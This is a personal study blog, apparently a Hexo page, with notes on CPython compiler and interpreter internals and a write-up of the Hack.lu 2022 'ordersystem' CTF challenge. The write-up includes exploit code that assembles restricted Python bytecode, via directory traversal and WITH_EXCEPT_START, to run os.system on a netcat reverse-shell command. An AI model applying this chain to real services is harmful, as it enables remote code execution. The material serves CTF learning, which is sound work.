<li><a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/computer-organization-instruction-formats-zero-one-two-three-address-instruction/">Instruction formats</a> are classified into different types depending upon the CPU organization. <a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/introduction-of-stack-based-cpu-organization/">CPU organization</a> is again classified into three types based on internal storage: <strong>Stack machine</strong>, Accumulator machine, General purpose organization or General register.</li>
<li>Stack machines extend <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Push-down_automata">push-down automata</a>(下推自动机) with additional load/store operations or multiple stacks and hence are Turing-complete. </li>
<li>开始看到上下文无关语法等等, 快死去的记忆开始攻击我. 一时看不完wiki, 找点浅显易懂的文章来. <a target="_blank" rel="noopener" href="https://users.ece.cmu.edu/~koopman/stack_computers/sec3_2.html">stackmachine book</a> | <a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/stack-machine-in-computer-organisation/">Geek</a> </li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://devguide.python.org/internals/compiler/index.html">python compiler design</a> : developer官方文档, 这里面好多, 但是看起挺有用…..看了也不知道说啥. 还是看他的reference文章.</li>
<li><a target="_blank" rel="noopener" href="https://tech.blog.aknin.name/category/my-projects/pythons-innards/">python innards</a> : 讲解ceval.c内容. <ul>
<li><a target="_blank" rel="noopener" href="https://tech.blog.aknin.name/2010/04/02/pythons-innards-introduction/">innards introduction</a> 前置知识, 溜一遍. 可惜就是十年前的终究有点过时. </li>
</ul>
</li>
<li>还可以看看python <a target="_blank" rel="noopener" href="https://docs.python.org/3/c-api">C API</a>. </li>
<li>还可以看看python reference的<a target="_blank" rel="noopener" href="https://docs.python.org/3.11/reference/datamodel.html#the-standard-type-hierarchy">data model</a> </li>
</ul>
</blockquote>
<p>真的好乱, 看到啥记下啥了.</p>
<h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc:"></a>Misc:</h4><ul>
<li><p>The function definition’s body is compiled into a <u><strong>code object.</strong></u> Then the function definition itself is compiled into code (inside the enclosing function body, module, etc.) that, when executed, builds a function object from that code object. (Once you think about how closures must work, it’s obvious why it works that way. Each instance of the closure is a separate function object with the same code object.)</p>
</li>
<li><p>dis module: <a target="_blank" rel="noopener" href="https://docs.python.org/3.10/library/dis.html#python-bytecode-instructions">bytecode instructions</a> </p>
<ul>
<li><em>Changed in version 3.6:</em> Use 2 bytes for each instruction. Previously the number of bytes varied by instruction.<em>Changed in version 3.10:</em> The argument of jump, exception handling and loop instructions is now the <strong>instruction offset</strong> rather than the byte offset.</li>
</ul>
</li>
<li><p>get information about live objects: <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/inspect.html#module-inspect">Inspect</a> </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/inspect.html#types-and-members">Types and members</a> :<code>function.__code__.co_code</code> to get code bytestring or <code>inspect.getmembers([func/module/class])</code> to see all members.</li>
</ul>
</li>
<li><p>python built-in function: <code>eval</code> &amp; <code>exec</code>. <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/2220699/whats-the-difference-between-eval-exec-and-compile">difference</a>: <code>eval</code> accepts only a <strong>single expression</strong>, <code>exec</code> can take a code block</p>
</li>
<li><p><strong>METHOD</strong> </p>
<ul>
<li>python的method是指在class里的, 而function就是字面意思. </li>
<li><em>bound methods</em>: a function is an attribute of class and it is accessed via the instances(common case)</li>
<li><em>unbound methods</em>: Methods that do not have an instance of the class as the first argument. As of Python 3.0, the unbound methods <strong>have been removed from the language</strong>. They are not bounded with any specific object of the class. To make the method work it should be made into a <strong>static method</strong>. </li>
</ul>
</li>
<li><p>use decorator<code>@staticmethod</code> or <code>staticmethod()</code>.</p>
</li>
<li><p><strong>PyObject</strong>:</p>
<ul>
<li>All Python objects ultimately <strong>share a small number of fields</strong> at the beginning of the object’s representation in memory. 这些字段就是指的<strong>PyObject</strong>, 所有object type都是该类型的扩展, 而且对外<strong>只使用<code>PyObject*</code>这种类型</strong>. </li>
<li><strong>PyVarObject</strong> is an extension of <a target="_blank" rel="noopener" href="https://docs.python.org/3/c-api/structures.html#c.PyObject"><code>PyObject</code></a> that adds the <code>ob_size</code> field. This is only used for objects that have some notion of <em>length</em>. 比如说<code>PyTupleObject</code>的头部就是一个<code>PyVarObject ob_base</code>. </li>
<li><code>co_names</code>是PyTuple类型的, 使用<code>names = PyTuple_New(n);</code>进行初始化. </li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://docs.python.org/3.11/reference/datamodel.html#objects-values-and-types">Data model</a> </p>
<ul>
<li><strong><u>Module</u></strong>: A module object has a <strong>namespace</strong> implemented by a <strong>dictionary</strong> object (this is the dictionary referenced by the <code>__globals__</code> attribute of functions defined in the module). Attribute references are translated to lookups in this dictionary, e.g., <code>m.x</code> is equivalent to <code>m.__dict__[&quot;x&quot;]</code>. A module object does not contain the code object used to initialize the module (since it isn’t needed once the initialization is done).</li>
<li><u><strong>Function</strong></u>: 不是很重要. </li>
<li><strong><u><em>Objects</em></u></strong> are Python’s abstraction for data. Every object has an identity, a type and a value. An object’s type determines the operations that the object supports (e.g., “does it have a length?”) and also defines the possible values for objects of that type.</li>
</ul>
</li>
</ul>
<hr>
<blockquote>
<p>除了python innards, <a target="_blank" rel="noopener" href="https://realpython.com/cpython-source-code-guide">这一篇</a>三年前写的比较新一点. 还有一些图解, 真不错. </p>
</blockquote>
<h4 id="Intro-amp-AST"><a href="#Intro-amp-AST" class="headerlink" title="Intro &amp; AST"></a>Intro &amp; AST</h4><ul>
<li><p>src structure(in Linux platform)</p>
<ul>
<li>Include — header files</li>
<li>Objects — object implementations, from int to type</li>
<li>Python — interpreter, bytecode compiler and other essential infrastructure</li>
<li>Parser — parser, lexer and parser generator</li>
<li>Modules — stdlib extension modules, and main.c </li>
<li>Programs — not much, but has the real main() function</li>
</ul>
<blockquote>
<p>when it comes to modern windows, lookup <code>PCBuild — Tools to build Python for modern Windows using Visual Studio</code> </p>
</blockquote>
</li>
<li><p>一时不知道要看哪个…先看看最新的这个吧. </p>
</li>
<li><p>Grammar is written in BNF. <a target="_blank" rel="noopener" href="https://en.m.wikipedia.org/wiki/Backus%E2%80%93Naur_form">https://en.m.wikipedia.org/wiki/Backus%E2%80%93Naur_form</a> </p>
</li>
<li><p>解释器工作流程:</p>
</li>
</ul>
<img src="../../image/recent_ctf/swim-lanes-chart-1.9fb3000aad85.png" srcset="/img/loading.gif" lazyload alt="Python run swim lane diagram" style="zoom: 67%;" />

<ul>
<li>AST直接跳过了, 看看object type之类的定义. 就比如stack其实是<code>PyObject *</code>类型的一样. </li>
<li>The <a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/compile.c#L312"><code>PyAST_CompileObject()</code></a> function is the main entry point to the CPython compiler. </li>
<li>But before the compiler starts, a global compiler state is created</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">compiler</span> &#123;</span><br>    PyObject *c_filename;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">symtable</span> *<span class="hljs-title">c_st</span>;</span><br>    PyFutureFeatures *c_future; <span class="hljs-comment">/* pointer to module&#x27;s __future__ */</span><br>    PyCompilerFlags *c_flags;<br><br>    <span class="hljs-keyword">int</span> c_optimize;              <span class="hljs-comment">/* optimization level */</span><br>    <span class="hljs-keyword">int</span> c_interactive;           <span class="hljs-comment">/* true if in interactive mode */</span><br>    <span class="hljs-keyword">int</span> c_nestlevel;<br>    <span class="hljs-keyword">int</span> c_do_not_emit_bytecode;  <span class="hljs-comment">/* The compiler won&#x27;t emit any bytecode</span><br><span class="hljs-comment">                                    if this value is different from zero.</span><br><span class="hljs-comment">                                    This can be used to temporarily visit</span><br><span class="hljs-comment">                                    nodes without emitting bytecode to</span><br><span class="hljs-comment">                                    check only errors. */</span><br><br>    PyObject *c_const_cache;     <span class="hljs-comment">/* Python dict holding all constants,</span><br><span class="hljs-comment">                                    including names tuple */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">compiler_unit</span> *<span class="hljs-title">u</span>;</span>     <span class="hljs-comment">/* compiler state for current block */</span><br>    PyObject *c_stack;           <span class="hljs-comment">/* Python list holding compiler_unit ptrs */</span> <span class="hljs-comment">//notice this line!!!!!!!!!!!!!!!!!</span><br>    PyArena *c_arena;            <span class="hljs-comment">/* pointer to memory allocation arena */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>then PyAST_CompileObject does the following things:<ul>
<li>some flag initializations … </li>
<li>Build a <strong>symbol table</strong> from the module object.</li>
<li><strong>Run the compiler</strong> with the compiler state and <strong>return the code object</strong>.</li>
<li>Free any allocated memory by the compiler.</li>
</ul>
</li>
</ul>
<h4 id="symbol-table"><a href="#symbol-table" class="headerlink" title="symbol table"></a>symbol table</h4><ul>
<li>In <a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/compile.c#L312"><code>PyAST_CompileObject()</code></a> there was a reference to a <code>symtable</code> and a call to <a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/symtable.c#L262"><code>PySymtable_BuildObject()</code></a> with the module to be executed. The purpose of the symbol table is to provide a list of namespaces, globals, and locals for the compiler to use for referencing and resolving scopes. </li>
<li>…</li>
</ul>
<h4 id="Core-Compilation-Process"><a href="#Core-Compilation-Process" class="headerlink" title="Core Compilation Process"></a>Core Compilation Process</h4><ul>
<li>Now that the <a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/compile.c#L312"><code>PyAST_CompileObject()</code></a> has a compiler state, a symtable, and a module in the form of the AST, the actual compilation can begin.</li>
<li>in cpython 3.11 branch, the PyCodeObject is in <code>Include\cpython\code.h</code> and is a macro. </li>
<li>放弃了, 暂时没帮助的编译细节. </li>
</ul>
<h4 id="Assembly"><a href="#Assembly" class="headerlink" title="Assembly"></a>Assembly</h4><p>如名, 没啥特别的.</p>
<h4 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a><a target="_blank" rel="noopener" href="https://realpython.com/cpython-source-code-guide/#conclusion_2">Conclusion</a></h4><p>编译大致过程, 知道这个就行了</p>
<h4 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a><a target="_blank" rel="noopener" href="https://realpython.com/cpython-source-code-guide/#execution">Execution</a></h4><ul>
<li>This stage forms the execution component of CPython. Each of the bytecode operations is taken and executed using a “Stack Frame” based system.</li>
<li>Before a frame can be executed, it needs to be referenced from a thread. CPython can have many threads running at any one time within a single interpreter. An Interpreter state <strong>includes a list of those threads as a linked list</strong>. The thread structure is called <strong><a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Include/pystate.h#L23"><code>PyThreadState</code></a></strong>, and there are many references throughout <code>ceval.c</code>.</li>
</ul>
<h4 id="Frame-Execution"><a href="#Frame-Execution" class="headerlink" title="Frame Execution"></a>Frame Execution</h4><ul>
<li>Frames are executed in the main execution loop inside <a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/ceval.c#L745"><code>_PyEval_EvalFrameDefault()</code></a>. This function is central function that brings everything together and brings your code to life. It contains decades of optimization since even a single line of code can have a significant impact on performance for the whole of CPython.</li>
</ul>
<h4 id="The-Value-Stack"><a href="#The-Value-Stack" class="headerlink" title="The Value Stack"></a><a target="_blank" rel="noopener" href="https://realpython.com/cpython-source-code-guide/#the-value-stack">The Value Stack</a></h4><p>我想看到的东西. </p>
<ul>
<li><code>PyObject **stack_pointer</code>指向栈顶的上一个位置. </li>
<li>switch in ceval.c:<ul>
<li>any operation that fails must <code>goto error</code>, all operation that succeed call <code>DISPATCH()</code> </li>
<li><code>DISPATCH()</code>:  if tracing is enabled, do the trace, if tracing is not enabled, a <code>goto</code> is called to <code>dispatch_opcode</code>, which jumps back to the top of the loop for the next instruction.</li>
<li><code>PREDICT()</code> macro will do the same as it says. When the prediction succeeds, it means execution flow haven’t to go through the loop again. </li>
</ul>
</li>
<li>Some of the operations, such as <code>CALL_FUNCTION</code>, <code>CALL_METHOD</code>, have an operation argument referencing another compiled function. In these cases, <strong>another frame is pushed to the frame stack in the thread</strong>, and the evaluation loop is run for that function until the function completes. <strong>Each time a new frame is created and pushed onto the stack, the value of the frame’s <code>f_back</code> is set to the current frame before the new one is created</strong>. </li>
</ul>
<h3 id="ordersystem-wp1-wp2"><a href="#ordersystem-wp1-wp2" class="headerlink" title="ordersystem wp1 wp2:"></a>ordersystem <a target="_blank" rel="noopener" href="https://enoflag.github.io/writeups/hacklu2022/ordersystem/">wp1</a> <a target="_blank" rel="noopener" href="https://qwerty-po.notion.site/Hack-lu-2022-Writeup-03ddbe17de6c47629d755998a5d6e411">wp2</a>:</h3><h4 id="src"><a href="#src" class="headerlink" title="src"></a>src</h4><ul>
<li>一个server, 但是连上去后不能向socket返回有用的信息. 而且flag在env里, 可能要<strong>反弹shell</strong>. </li>
<li>用字典类型<code>ENTRIES</code>来保存输入的信息. 其中key最多12字节, 可以是任意bytes, 但是data只能是printable hex number, 长度为0-255.</li>
<li>可保存data到storage文件夹中的key.decode或者key.hex(作为文件名称), <strong>还可以</strong>directory traversal到plugins文件夹中. </li>
<li>执行plugins时读取<strong>plugin文件夹下</strong>相应bytecode文件, 将<strong>所有key</strong>加上<code>plugin_log(msg,filename=&#39;./log&#39;,raw=False)</code>放到codeType的<strong>consts</strong>中, <strong>将bytecode后面使用分号隔开的bytes放到names中</strong>.<br>其中log函数可做到将第一个参数的内容(无限制)写入filename. 这或许就是我们想要的无限制代码入口了. 在根目录的log文件显然执行不了. 怎么在limit_code里控制msg和filename的内容呢?查看下可用指令列表, 发现只有LOAD_CONST能用了, 而且consts就是我们所控制的无限制的key. </li>
</ul>
<p>docker安装的python版本是3.10.6</p>
<p>明确几点:</p>
<ul>
<li><strong>能控制的</strong>: key + 有限制的value + 把value存到key中,可目录穿越,有限制的插件代码 + 执行plugin时可控制consts和names +<br>结合<code>WITH_EXCEPT_START</code>可以实现调用函数,于是无限制log可用. </li>
<li><strong>想到的</strong>: plugin没东西, 最多有限制的代码. 能不能用限制的代码写入一份没限制的反弹shell代码?</li>
<li><strong>想控制的</strong>: execute_plugin时能够调用plugin_log并控制msg和filename参数. </li>
<li><strong>结论</strong>: 把代码放在key中, 多次调用limit_code附加到<code>./plugin/expl</code>中, 最终执行expl</li>
</ul>
<h4 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h4><ul>
<li><p>because of the hexdump executed by server, we can only send printable hex numbers, which dramatically lessens our options.<br>notice that the code in block is actually a condition statement……….</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">1</span>]: <span class="hljs-keyword">import</span> dis<br>   ...: &#123;<br>   ...:     <span class="hljs-built_in">hex</span>(op_code): op_name<br>   ...:     <span class="hljs-keyword">for</span> op_name, op_code <span class="hljs-keyword">in</span> dis.opmap.items()<br>   ...:     <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(op_code) <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdef&quot;</span><br>   ...: &#125;<br>Out[<span class="hljs-number">1</span>]:<br>&#123;<span class="hljs-string">&#x27;0x31&#x27;</span>: <span class="hljs-string">&#x27;WITH_EXCEPT_START&#x27;</span>,<br> <span class="hljs-string">&#x27;0x32&#x27;</span>: <span class="hljs-string">&#x27;GET_AITER&#x27;</span>,<br> <span class="hljs-string">&#x27;0x33&#x27;</span>: <span class="hljs-string">&#x27;GET_ANEXT&#x27;</span>,<br> <span class="hljs-string">&#x27;0x34&#x27;</span>: <span class="hljs-string">&#x27;BEFORE_ASYNC_WITH&#x27;</span>,<br> <span class="hljs-string">&#x27;0x36&#x27;</span>: <span class="hljs-string">&#x27;END_ASYNC_FOR&#x27;</span>,<br> <span class="hljs-string">&#x27;0x37&#x27;</span>: <span class="hljs-string">&#x27;INPLACE_ADD&#x27;</span>,<br> <span class="hljs-string">&#x27;0x38&#x27;</span>: <span class="hljs-string">&#x27;INPLACE_SUBTRACT&#x27;</span>,<br> <span class="hljs-string">&#x27;0x39&#x27;</span>: <span class="hljs-string">&#x27;INPLACE_MULTIPLY&#x27;</span>,<br> <span class="hljs-string">&#x27;0x61&#x27;</span>: <span class="hljs-string">&#x27;STORE_GLOBAL&#x27;</span>,<br> <span class="hljs-string">&#x27;0x62&#x27;</span>: <span class="hljs-string">&#x27;DELETE_GLOBAL&#x27;</span>,<br> <span class="hljs-string">&#x27;0x63&#x27;</span>: <span class="hljs-string">&#x27;ROT_N&#x27;</span>,<br> <span class="hljs-string">&#x27;0x64&#x27;</span>: <span class="hljs-string">&#x27;LOAD_CONST&#x27;</span>,<br> <span class="hljs-string">&#x27;0x65&#x27;</span>: <span class="hljs-string">&#x27;LOAD_NAME&#x27;</span>,<br> <span class="hljs-string">&#x27;0x66&#x27;</span>: <span class="hljs-string">&#x27;BUILD_TUPLE&#x27;</span>&#125;<br></code></pre></div></td></tr></table></figure></li>
<li><p>but the <code>WITH_EXCEPT_START</code> is something special. </p>
<blockquote>
<p><code>WITH_EXCEPT_START</code>: Calls the function in position 7 on the stack with the top three items on the stack as arguments. Used to implement the call <code>context_manager.__exit__(*exc_info())</code> when an exception has occurred in a <a target="_blank" rel="noopener" href="https://docs.python.org/3.10/reference/compound_stmts.html#with">with</a> statement.</p>
</blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://docs.python.org/3.10/reference/compound_stmts.html#with">with statement</a>(有更多东西) | <a target="_blank" rel="noopener" href="https://docs.python.org/3.10/library/stdtypes.html#typecontextmanager">context manager</a> </li>
<li>通过with语句的流程看出来貌似在with_statement evaluate之后的值自带manager, 比如open()返回的file object中就有<code>__enter__</code>函数, 而且enter也不需要做什么就直接返回file object. 而<code>__exit__</code>就是直接调用close()</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* At the top of the stack are 7 values:</span><br><span class="hljs-comment">   - (TOP, SECOND, THIRD) = exc_info()</span><br><span class="hljs-comment">   - (FOURTH, FIFTH, SIXTH) = previous exception for EXCEPT_HANDLER</span><br><span class="hljs-comment">   - SEVENTH: the context.__exit__ bound method</span><br><span class="hljs-comment">   We call SEVENTH(TOP, SECOND, THIRD).</span><br><span class="hljs-comment">   Then we push again the TOP exception and the __exit__</span><br><span class="hljs-comment">   return value.</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure></li>
</ul>
<p>下面这个流程也是不断的修改之后才成功的……</p>
<ol>
<li>Calculate proof of work to get the real target port, 使用docker完全见不到. </li>
<li>Craft python bytecode which will spawn a reverse shell to the attacker’s machine as <code>exp_bc</code>  </li>
<li>Divide <code>exp_bc</code> into chunks of 12 bytes</li>
<li>Upload the filling consts to 0x30 items. </li>
<li>Upload num_chunk plugins and <code>dump()</code> </li>
<li>Store <code>exp_bc</code> as keys in the storage</li>
<li>Run one plugin for each chunk which appends the key to the logfile aka exploit plugin</li>
<li>Upload nc command string. </li>
<li>Run the exploit plugin</li>
</ol>
<h4 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof of work"></a>proof of work</h4><p>?</p>
<h4 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># This is the index where we will later store the nc command</span><br>nc_index = <span class="hljs-number">55</span><br>co_names = [<span class="hljs-string">&quot;len&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>, <span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>]<br>exploit_asm = [<br>    <span class="hljs-comment"># Get length of empty list to push 0 on the stack</span><br>    (<span class="hljs-string">&quot;BUILD_LIST&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Use NOP as arg to simplify compiler ?????what is nop?? 不就是压入了一个long类型的0吗, 这个指令不需要参数.</span><br>    (<span class="hljs-string">&quot;GET_LEN&quot;</span>, <span class="hljs-number">0x09</span>),<br>    <span class="hljs-comment"># Invoke print() to push None onto the stack</span><br>    (<span class="hljs-string">&quot;LOAD_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;print&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_FUNCTION&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Import os</span><br>    (<span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;os&quot;</span>)),<br>    <span class="hljs-comment"># Invoke os.system()</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;system&quot;</span>)),<br>    <span class="hljs-comment"># Decode first batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index),    <span class="hljs-comment">#load了一个string object, 所以可以在他之上调用decode函数.</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode second batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">1</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode third batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">2</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Concatenate the three strings</span><br>    (<span class="hljs-string">&quot;BUILD_STRING&quot;</span>, <span class="hljs-number">3</span>),<br>    <span class="hljs-comment"># Finaly invoke the nc command</span><br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">1</span>)<br>]<br></code></pre></div></td></tr></table></figure>

<p>Then, we can “assemble” the code:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">exp_bc = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> op, arg <span class="hljs-keyword">in</span> exploit_asm:<br>    exp_bc += <span class="hljs-built_in">bytes</span>([dis.opmap[op], arg])<br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> co_names:<br>    exp_bc += <span class="hljs-string">b&#x27;;&#x27;</span> + name.encode()<br>exp_bc += <span class="hljs-string">b&#x27;;&#x27;</span><br></code></pre></div></td></tr></table></figure>

<p>可以看出来指令非常的简单, 就是一个字节指令加上一个字节操作数. </p>
<ul>
<li>为什么是分号? <strong>是题目源码中识别到有分号时自动把names加入到CodeObject.names</strong> </li>
<li>还要注意到nc_index, 这是在upload所有的key之后才确定下来的偏移, 因为limit_code的操作数必须是在printable hex的范围之内, 所以干脆把nc命令的这一个字符串和limit_code的参数放到<code>consts[0x30:0x40]</code>的部分. </li>
<li>这里有个坑(自己作的)就是在第二个for之前也在bc后面加上了分号, 导致co_names的第一个就是空字节串, 所有的idx都不对了, 看到了什么<code>No module named &#39;print&#39;</code>这种神奇报错. </li>
<li>比较疑惑的是print只是个字符串, 为什么会被CALL_FUNCTION当做是callable? 原来load_name不仅是从names中取出了名称字符串, 而且在local和global两个scope中查找到了对应的item, 这里的print对应的是一个callable item, 自然是可以被CALL_FUNCTION调用的. !!</li>
</ul>
<h4 id="填充consts前48个位置"><a href="#填充consts前48个位置" class="headerlink" title="填充consts前48个位置"></a>填充consts前48个位置</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#fill slots</span><br>chunk_size = <span class="hljs-number">12</span><br>num_chunks = <span class="hljs-built_in">len</span>(exp_bc) // chunk_size + <span class="hljs-number">1</span><br><span class="hljs-comment"># num_chunk is 6, limit_code is 6, total is 12, and plugin_log will be 13</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span> - num_chunks):<br>    upload_key(<span class="hljs-string">b&#x27;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;%d&#x27;</span> % (i+<span class="hljs-number">10</span>))<br></code></pre></div></td></tr></table></figure>

<p>48=0x30, 为了把数据放在<code>\x30</code>中, 先把前面的部分填满, 最后剩下6个位置放入</p>
<h4 id="Upload-limit-code"><a href="#Upload-limit-code" class="headerlink" title="Upload limit_code"></a>Upload limit_code</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#upload limit_code as serveral plugins in data</span><br>func_idx = <span class="hljs-number">48</span>+<span class="hljs-number">6</span>+<span class="hljs-number">1</span><br>msg_idx = <span class="hljs-number">0x30</span><br>fn_idx = <span class="hljs-number">0x30</span>+<span class="hljs-number">6</span><br>raw_idx = <span class="hljs-number">0x30</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_chunks):<br>    bc = get_plugin_code(i+msg_idx, func_idx, fn_idx, raw_idx)<br>    store(<span class="hljs-string">b&#x27;../plugins/%d&#x27;</span> % i, bc)<br>dump()<br></code></pre></div></td></tr></table></figure>

<p>这些idx都是事后填上的. 其中raw是随便一个不为空的变量, func_idx是最后一个consts.</p>
<p>还有一个问题是func_idx已经是55, 后面的command的三个位置已经放不下, 所以执行完六个plugins后才能上传命令. </p>
